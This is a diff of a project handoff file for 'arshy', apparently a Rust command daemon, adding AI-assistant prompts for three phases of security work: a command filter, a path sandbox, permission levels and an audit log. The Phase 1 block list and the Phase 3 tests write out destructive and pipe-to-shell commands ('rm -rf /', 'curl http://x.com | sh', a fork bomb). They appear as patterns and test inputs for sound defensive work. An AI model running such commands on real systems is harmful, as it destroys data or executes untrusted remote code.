@@ -1,20 +1,249 @@
 # Arshy 项目交接文档
 
-> 新对话直接粘贴以下 prompt 启动。
+> 新对话直接粘贴对应 Phase 的 prompt 启动。
 
 ---
 
-## 启动 Prompt（直接复制粘贴）
+## Phase 1 Prompt — I1 命令过滤引擎
 
 ```
-Continue from where the project left off. Read HANDOFF.md in the project root for full context, then begin implementing Stage I (Security).
+You are implementing Stage I Step I1 (Command Filter Engine) for the arshy project.
 
-Key rules:
-1. No backward compatibility — always use latest interfaces
-2. Every change must pass: cargo build + cargo clippy + cargo test
-3. All new code must have tests
-4. Follow existing code patterns exactly
+## What to do first
+
+1. Read this file: /Users/izoy/Documents/arshy/HANDOFF.md
+2. Read these source files to understand existing patterns:
+   - src/daemon/exec/mod.rs (Executor — where filter will be inserted)
+   - src/daemon/store/mod.rs (example of module structure pattern)
+   - src/ipc/mod.rs (IPC types)
+   - src/config/mod.rs (Config system)
+
+## I1 Requirements
+
+Create `src/daemon/security/` module with:
+
+### 1. `mod.rs` — module root
+### 2. `filter.rs` — CommandFilter struct
+
+```rust
+pub struct CommandFilter {
+    blocked_patterns: Vec<regex::Regex>,
+    allowed_commands: Option<Vec<String>>,
+}
+
+impl CommandFilter {
+    pub fn from_config(config: &SecurityConfig) -> Self;
+
+    /// Check if command is allowed. Returns Ok(()) or Err with reason.
+    pub fn check(&self, command: &str) -> Result<()>;
+}
 ```
+
+Default blocked patterns (must include all of these):
+- `rm\s+-rf\s+/` — root deletion
+- `rm\s+-rf\s+~/` — home deletion
+- `curl.*\|\s*sh` — remote code execution
+- `wget.*\|\s*sh` — remote code execution
+- `dd\s+if=` — disk overwrite
+- `mkfs` — filesystem format
+- `:(){ :\|:& };:` — fork bomb
+
+### 3. Integration point
+
+In `src/daemon/exec/mod.rs`, the `Executor::run()` method — add filter check at the very beginning, BEFORE creating task or spawning PTY:
+
+```rust
+pub async fn run(&self, command: &str, cwd: Option<&str>, timeout_ms: Option<u64>, mode: &str) -> Result<RunResult> {
+    // NEW: security filter check
+    self.filter.check(command)?;
+
+    // ... existing code
+}
+```
+
+### 4. Config additions
+
+Add to `src/config/mod.rs` a `SecurityConfig` struct:
+
+```rust
+pub struct SecurityConfig {
+    pub blocked_patterns: Vec<String>,    // regex strings
+    pub allowed_commands: Option<Vec<String>>,  // whitelist (None = not enforced)
+    pub sandbox_paths: Vec<String>,       // for I2 later
+    pub access_level: String,             // "full" | "read-only", for I3 later
+    pub audit_log: Option<String>,        // for I4 later
+}
+```
+
+Add `[security]` section to default config with the blocked patterns above.
+
+### 5. Tests
+
+Add tests in `filter.rs`:
+- blocked command is rejected
+- safe command passes
+- whitelist blocks unknown commands when enabled
+- regex patterns match correctly
+
+## Rules
+1. cargo build + cargo clippy + cargo test must pass with 0 errors/warnings
+2. All new code needs tests
+3. Follow existing code patterns (see store/mod.rs for module style)
+4. Do NOT implement I2/I3/I4/I5 — only I1
+5. The Filter struct should be stored in Executor (add field to Executor struct)
+```
+
+---
+
+## Phase 2 Prompt — I4 审计日志 + I2/I3 路径沙箱+权限
+
+```
+You are implementing Stage I Steps I2, I3, I4 for the arshy project. I1 (CommandFilter) is already done.
+
+## What to do first
+
+1. Read this file: /Users/izoy/Documents/arshy/HANDOFF.md
+2. Read the security module that I1 created:
+   - src/daemon/security/mod.rs
+   - src/daemon/security/filter.rs
+3. Read: src/daemon/exec/mod.rs (Executor — where sandbox/permission checks go)
+4. Read: src/daemon/ipc_handler.rs (where permission checks for read-only go)
+
+## I2 — Path Sandbox
+
+In `filter.rs` or new `sandbox.rs`, add path validation:
+
+```rust
+pub fn check_path(cwd: &str, sandbox_paths: &[String]) -> Result<()>;
+```
+
+- If sandbox_paths is empty, skip check (permissive default)
+- If sandbox_paths is set, cwd must be within one of them
+- Reject `../` escapes and symlink escapes
+- Add to Executor::run() after command filter check
+
+## I3 — Permission Level
+
+In ipc_handler.rs `dispatch()`:
+
+```rust
+// Before METHOD_RUN and METHOD_KILL:
+if executor.access_level() == "read-only" {
+    return Err(ArshyError::Ipc("access denied: read-only mode".into()));
+}
+```
+
+- Add `access_level` field to Executor (from config)
+- read-only mode: reject task/run and task/kill
+- query/list/tail always allowed
+
+## I4 — Audit Log
+
+Create `src/daemon/security/audit.rs`:
+
+```rust
+pub struct AuditLog {
+    path: PathBuf,
+}
+
+impl AuditLog {
+    pub fn new(path: &PathBuf) -> Self;
+    pub fn log(&self, entry: &AuditEntry) -> Result<()>;
+}
+
+pub struct AuditEntry {
+    pub timestamp: chrono::DateTime<chrono::Utc>,
+    pub task_id: String,
+    pub command: String,
+    pub cwd: Option<String>,
+    pub exit_code: Option<i32>,
+    pub blocked: bool,
+    pub reason: Option<String>,
+}
+```
+
+- Append-only file (OpenOptions::create(true).append(true))
+- Write JSON lines format
+- Log in Executor::run() after filter check (whether blocked or allowed)
+- Log on task completion with exit_code
+- Independent of SQLite (not affected by prune)
+
+## Tests
+
+- I2: path inside sandbox passes, path with ../ rejected, symlink escape rejected
+- I3: read-only mode rejects run/kill, full mode allows all
+- I4: audit log file created, entries written correctly, append-only
+
+## Rules
+1. cargo build + cargo clippy + cargo test must pass
+2. All new code needs tests
+3. Do NOT modify I1 code — add new code alongside it
+4. Keep filter.rs from I1 intact
+```
+
+---
+
+## Phase 3 Prompt — I5 安全测试 + 全量验证
+
+```
+You are implementing Stage I Step I5 (Security Integration Tests) for the arshy project. I1-I4 are already done.
+
+## What to do first
+
+1. Read: /Users/izoy/Documents/arshy/HANDOFF.md
+2. Read all security module files:
+   - src/daemon/security/mod.rs
+   - src/daemon/security/filter.rs
+   - src/daemon/security/audit.rs (if exists)
+3. Read: src/daemon/exec/mod.rs
+4. Read: src/daemon/ipc_handler.rs (existing integration tests as reference)
+
+## I5 — Security Integration Tests
+
+Add comprehensive tests covering:
+
+### Filter tests
+- `rm -rf /` → blocked
+- `curl http://x.com | sh` → blocked
+- `ls -la` → allowed
+- `cargo build` → allowed
+- `git status` → allowed
+- Whitelist mode: only listed commands pass
+
+### Sandbox tests
+- cwd inside sandbox → allowed
+- cwd with ../ escape → blocked
+- cwd outside sandbox paths → blocked
+
+### Permission tests
+- read-only mode: task/run → denied
+- read-only mode: task/kill → denied
+- read-only mode: task/query → allowed
+- full mode: all operations allowed
+
+### Audit tests
+- Run a command → audit log has entry
+- Blocked command → audit log has entry with blocked=true
+- Audit file is append-only (write twice, both entries present)
+
+### End-to-end security test
+- Full stack: spawn daemon pair → run blocked command → verify rejected + audit logged
+- Full stack: read-only mode → verify run rejected
+
+## Reference: existing integration test pattern
+
+See src/daemon/ipc_handler.rs tests::spawn_daemon_pair() for the test helper pattern.
+
+## Rules
+1. cargo build + cargo clippy + cargo test must pass
+2. Tests should be in a new file: tests/security_integration.rs
+3. Or in the security module test section
+4. ALL Stage I tests must pass (I1-I5 combined)
+```
+
+---
+
+## 项目状态
 
 ---
 
